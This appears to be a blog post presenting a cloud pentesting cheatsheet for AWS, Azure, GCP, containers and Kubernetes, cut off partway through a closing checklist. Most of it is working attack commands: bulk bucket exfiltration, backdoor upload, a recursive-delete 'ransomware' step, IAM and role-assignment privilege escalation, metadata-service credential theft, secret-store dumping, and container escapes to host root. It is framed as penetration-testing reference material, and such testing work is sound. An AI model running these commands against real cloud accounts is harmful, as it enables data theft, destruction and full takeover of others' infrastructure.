                    <h1 class="blog-title">Cloud Pentesting Cheatsheet</h1>
                    <div class="blog-meta">
                        <div class="author">
                            <div class="author-avatar">H</div>
                            <span>hackherway</span>
                        </div>
                        <span>June 3, 2026</span>
                        <span>22 min read</span>
                    </div>
                </article>

                <div class="blog-content">
                    <p id="cloud-intro">
                        The cloud isn't secure. It's just someone else's computer that you can access with a leaked GitHub token. AWS, Azure, and GCP have built the most sophisticated privilege escalation frameworks ever conceived, and they rent them to you by the hour. The cloud shared responsibility model means AWS secures the building, but you left the front door wide open with a sticky note that says "password: admin123." This is how you find those doors, walk through them, and then convince the client that "cloud-native security" is a marketing term, not an architecture.
                    </p>

                    <h2 id="cloud-aws">AWS</h2>
                    <p>
                        AWS has over 200 services, and approximately 199 of them can be misconfigured to leak data. IAM is the root of all evil — it's a permission system so complex that even AWS engineers can't explain it without a whiteboard and three hours. S3 buckets are public by default in spirit, even when they're "private" in configuration. And Lambda functions are just containers that execute your code with whatever IAM role someone attached to them in a hurry.
                    </p>

                    <h3 id="cloud-s3">S3 Bucket Abuse</h3>
                    <pre><code># === S3 ENUMERATION ===
# List buckets (requires credentials)
aws s3 ls

# List bucket contents
aws s3 ls s3://target-bucket --recursive

# Check bucket policy
aws s3api get-bucket-policy --bucket target-bucket

# Check bucket ACL
aws s3api get-bucket-acl --bucket target-bucket

# Check public access settings
aws s3api get-public-access-block --bucket target-bucket

# === S3 DATA EXFILTRATION ===
# Download everything
aws s3 sync s3://target-bucket ./loot/

# Download specific files
aws s3 cp s3://target-bucket/secrets.txt ./

# Upload backdoor (if write access)
aws s3 cp shell.php s3://target-bucket/

# === S3 BUCKET BRUTE FORCE ===
# Common naming patterns
target-company
targetcompany
target-company-backup
targetcompany-data
targetcompany-dev
targetcompany-prod

# Tools
s3scanner scan --buckets buckets.txt
cloud_enum -k targetcompany

# === S3 PRESIGNED URLS ===
# Generate URLs that work even for "private" buckets
aws s3 presign s3://target-bucket/file.txt --expires-in 3600

# === S3 RANSOMWARE ===
# If you have write/delete access:
aws s3 rm s3://target-bucket/ --recursive
# Or encrypt everything with KMS and delete the key</code></pre>

                    <h3 id="cloud-iam">IAM Privilege Escalation</h3>
                    <pre><code># === IAM ENUMERATION ===
# List current user permissions
aws iam get-user
aws iam list-attached-user-policies --user-name currentuser
aws iam list-user-policies --user-name currentuser

# List all users, roles, policies
aws iam list-users
aws iam list-roles
aws iam list-policies --scope Local

# Check for inline policies (often overlooked)
aws iam list-role-policies --role-name somerole
aws iam get-role-policy --role-name somerole --policy-name inlinepolicy

# === IAM PRIVILEGE ESCALATION PATHS ===
# iam:CreatePolicyVersion + iam:SetDefaultPolicyVersion
# Create new policy version with admin rights
aws iam create-policy-version --policy-arn arn:aws:iam::123456789012:policy/targetpolicy \
  --policy-document file://admin_policy.json --set-as-default

# iam:AttachUserPolicy / iam:AttachRolePolicy
# Attach AWS managed AdministratorAccess policy
aws iam attach-user-policy --user-name currentuser --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# iam:CreateAccessKey
# Create new access keys for other users
aws iam create-access-key --user-name adminuser

# iam:UpdateAssumeRolePolicy + sts:AssumeRole
# Modify role trust policy to allow assumption
# Then assume the role and get new credentials
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/AdminRole --role-session-name pwned

# lambda:UpdateFunctionCode + lambda:InvokeFunction
# Update a Lambda function with malicious code
# Lambda executes with its attached role's permissions
aws lambda update-function-code --function-name target-function --zip-file fileb://payload.zip
aws lambda invoke --function-name target-function output.txt

# ec2:RunInstances + iam:PassRole
# Launch EC2 instance with high-privilege IAM instance profile
# SSRF or metadata service to steal credentials
aws ec2 run-instances --image-id ami-12345 --instance-type t2.micro \
  --iam-instance-profile Name=AdminProfile --user-data file://payload.sh

# === CREDENTIAL HARVESTING ===
# EC2 Instance Metadata Service (IMDSv1 is vulnerable to SSRF)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/RoleName

# ECS Task Metadata
# curl $ECS_CONTAINER_METADATA_URI/task
# curl $ECS_CONTAINER_METADATA_URI/taskWithTags

# EKS (Kubernetes) ServiceAccount tokens
# /var/run/secrets/kubernetes.io/serviceaccount/token

# Lambda environment variables
# Often contain database passwords, API keys, secrets
# Check in AWS Console or via CLI
aws lambda get-function --function-name target</code></pre>

                    <h3 id="cloud-lambda">Lambda & Container SSRF</h3>
                    <pre><code># === LAMBRA SSRF ===
# Lambda functions often have outbound internet access
# Use them to hit internal services or the metadata service
import requests

def lambda_handler(event, context):
    # Access EC2 metadata if Lambda has VPC access
    r = requests.get("http://169.254.169.254/latest/meta-data/")
    return r.text

# === CONTAINER ESCAPE VIA LAMBDA ===
# Lambda runs in a container, but with restricted privileges
# However, /tmp is writable and some syscalls work
# Check for mounted host paths or Docker socket

# === API GATEWAY ABUSE ===
# API Gateway can proxy requests to internal VPC endpoints
# Use it to access services not exposed to the internet
aws apigateway create-rest-api --name internal-proxy
# Create resource, method, integration pointing to VPC Link

# === CLOUDFRONT ORIGIN S3 ===
# If S3 origin is misconfigured, access via CloudFront domain
# Bypasses S3 bucket policies that restrict by referer
# Origin Access Identity (OAI) should be used, often isn't</code></pre>

                    <h2 id="cloud-azure">Azure</h2>
                    <p>
                        Azure is AWS for companies that think Microsoft is still a monopoly. Entra ID (formerly Azure AD) is Active Directory in the cloud, which means it has all the same vulnerabilities plus some cloud-specific ones. Azure RBAC is IAM with a different accent. And Azure Key Vault is where secrets go to be forgotten until a pentester finds them.
                    </p>
                    <pre><code># === AZURE ENUMERATION ===
# Login
az login

# List subscriptions
az account list

# List resources
az resource list

# List VMs
az vm list
az vm show --name target-vm --resource-group target-rg

# List storage accounts
az storage account list
az storage account keys list --account-name targetstorage

# List Key Vaults
az keyvault list
az keyvault secret list --vault-name target-vault
az keyvault secret show --name admin-password --vault-name target-vault

# === AZURE AD ENUMERATION ===
# List users
az ad user list

# List groups
az ad group list

# List service principals (applications)
az ad sp list

# List role assignments
az role assignment list

# === AZURE PRIVILEGE ESCALATION ===
# Owner or Contributor on subscription = full control
# User Access Administrator = can assign roles to yourself

# Add yourself as Owner
az role assignment create --assignee your@email.com \
  --role "Owner" --scope /subscriptions/YOUR-SUB-ID

# Managed Identity abuse
# VMs with Managed Identity get Azure AD tokens
# Access from within the VM:
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' \
  -H Metadata:true

# Use the token to access Azure APIs
# Or request tokens for other resources (Key Vault, Storage, etc.)

# === AZURE STORAGE ABUSE ===
# Public blob containers
az storage blob list --account-name targetstorage --container-name public --auth-mode login

# SAS tokens (Shared Access Signature)
# Often leaked in URLs, logs, GitHub repos
# Can have read/write/delete permissions
# Valid for years if not configured properly

# === AZURE KEY VAULT ===
# If you have access, extract all secrets
az keyvault secret list --vault-name target-vault
az keyvault secret show --name db-password --vault-name target-vault

# Also check for certificates and keys
az keyvault certificate list --vault-name target-vault
az keyvault key list --vault-name target-vault</code></pre>

                    <h2 id="cloud-gcp">GCP</h2>
                    <p>
                        Google Cloud Platform is the cloud for companies that think Kubernetes is a personality trait. GCP's IAM is actually saner than AWS and Azure, but that just means the misconfigurations are more subtle. Service accounts are the weak point — they're everywhere, they're overprivileged, and their keys live in JSON files that get committed to GitHub with depressing regularity.
                    </p>
                    <pre><code># === GCP ENUMERATION ===
# Authenticate
gcloud auth login
gcloud auth activate-service-account --key-file service-account.json

# List projects
gcloud projects list

# Set project
gcloud config set project target-project

# List resources
gcloud compute instances list
gcloud storage ls
gcloud functions list
gcloud run services list

# List IAM policies
gcloud projects get-iam-policy target-project
gcloud compute instances get-iam-policy target-vm

# === SERVICE ACCOUNT ABUSE ===
# Service accounts are the keys to the kingdom
# They have email addresses like: 123456789@target-project.iam.gserviceaccount.com

# List service accounts
gcloud iam service-accounts list

# Create new key for existing service account
gcloud iam service-accounts keys create key.json \
  --iam-account target@target-project.iam.gserviceaccount.com

# Impersonate service account (if you have iam.serviceAccounts.getAccessToken)
gcloud auth activate-service-account --key-file stolen-key.json

# === GCP PRIVILEGE ESCALATION ===
# roles/owner = full control
# roles/editor = almost full control
# roles/iam.securityAdmin = can modify IAM policies

# Add yourself as Owner
gcloud projects add-iam-policy-binding target-project \
  --member user:your@email.com --role roles/owner

# Cloud Functions abuse (similar to Lambda)
# Update function with malicious code
gcloud functions deploy target-function --source ./payload

# Cloud Run (containerized apps)
# Often has service account with excessive permissions
gcloud run services list
gcloud run services describe target-service

# === GCS (Google Cloud Storage) ===
# List buckets
gsutil ls

# List bucket contents
gsutil ls -r gs://target-bucket/

# Download data
gsutil cp -r gs://target-bucket/ ./loot/

# Check bucket permissions
gsutil iam get gs://target-bucket

# === GCP METADATA SERVICE ===
# Similar to AWS, but with some differences
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# Get project metadata
curl "http://metadata.google.internal/computeMetadata/v1/project/project-id" \
  -H "Metadata-Flavor: Google"</code></pre>

                    <h2 id="cloud-container">Container Escape</h2>
                    <p>
                        Containers are not VMs. They're process isolation with good marketing. If you're in a container with privileged mode, host PID namespace, or mounted Docker socket, you're one command away from host root. And even without those, kernel exploits and misconfigured capabilities can break you out.
                    </p>
                    <pre><code># === CHECK CONTAINER PRIVILEGES ===
# Am I in a container?
ls -la /.dockerenv 2>/dev/null
# If it exists, you're in Docker

# Check capabilities
capsh --print
# Look for cap_sys_admin, cap_sys_ptrace, cap_sys_module

# Check for mounted host paths
mount | grep /dev/sd
mount | grep /etc
mount | grep /root

# Check for Docker socket
ls -la /var/run/docker.sock

# === PRIVILEGED CONTAINER ESCAPE ===
# If --privileged is set, you have full device access
# Mount host filesystem:
fdisk -l
mkdir /tmp/host
mount /dev/sda1 /tmp/host
chroot /tmp/host /bin/bash

# Or use nsenter (if host PID namespace)
nsenter --target 1 --mount --uts --ipc --net /bin/bash

# === DOCKER SOCKET ESCAPE ===
# If /var/run/docker.sock is mounted:
docker run -v /:/host -it alpine chroot /host sh

# === CAP_SYS_ADMIN ESCAPE ===
# With CAP_SYS_ADMIN, you can mount filesystems
mkdir /tmp/cgroup
mount -t cgroup -o rdma cgroup /tmp/cgroup
mkdir /tmp/cgroup/x
echo 1 > /tmp/cgroup/x/notify_on_release
# Trigger release_agent to execute arbitrary command

# === KUBERNETES ESCAPE ===
# Check for service account token
ls -la /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# If you have the token, access the Kubernetes API
curl -k https://kubernetes.default.svc/api/v1/namespaces/default/pods \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"

# List secrets (often contain credentials)
curl -k https://kubernetes.default.svc/api/v1/namespaces/default/secrets \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"

# Escape via privileged pod creation
# If you can create pods, create a privileged one with host access
kubectl run escape --image=alpine --privileged --hostpid --hostnetwork \
  --overrides='{"spec":{"containers":[{"name":"escape","image":"alpine","securityContext":{"privileged":true},"volumeMounts":[{"mountPath":"/host","name":"host"}]}],"volumes":[{"name":"host","hostPath":{"path":"/"}}]}}'</code></pre>

                    <h2 id="cloud-secrets">Secrets Management</h2>
                    <p>
                        Secrets in the cloud are like keys under the doormat — everyone knows they shouldn't be there, but they always are. Environment variables, config files, GitHub repos, and chat logs are the four horsemen of secret leakage. And when you find one AWS access key in a repo, you can bet there are five more in the commit history.
                    </p>
                    <pre><code># === FINDING SECRETS ===
# In GitHub repos
git log -p | grep -i "password\|secret\|key\|token\|aws_access_key_id"
# Use truffleHog or gitleaks for automated scanning

# In environment variables
env | grep -i "key\|secret\|password\|token"
cat /proc/*/environ 2>/dev/null | strings | grep -i "key\|secret"

# In configuration files
find / -name "*.env" -o -name "*.config" -o -name "*.yaml" -o -name "*.json" 2>/dev/null | xargs grep -l "password\|secret" 2>/dev/null

# In cloud metadata
# AWS: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Azure: curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true
# GCP: curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"

# === SECRETS MANAGER ABUSE ===
# AWS Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id prod/db/password

# AWS Systems Manager Parameter Store
aws ssm get-parameters-by-path --path /
aws ssm get-parameter --name /prod/db/password --with-decryption

# Azure Key Vault
az keyvault secret list --vault-name target-vault
az keyvault secret show --name admin-password --vault-name target-vault

# GCP Secret Manager
gcloud secrets list
gcloud secrets versions access latest --secret target-secret</code></pre>

                    <h2 id="cloud-checklist">Quick Checklist</h2>
                    <ul>
                        <li><code>aws s3 ls</code> — list S3 buckets</li>
                        <li><code>aws s3api get-public-access-block</code> — check S3 public access</li>
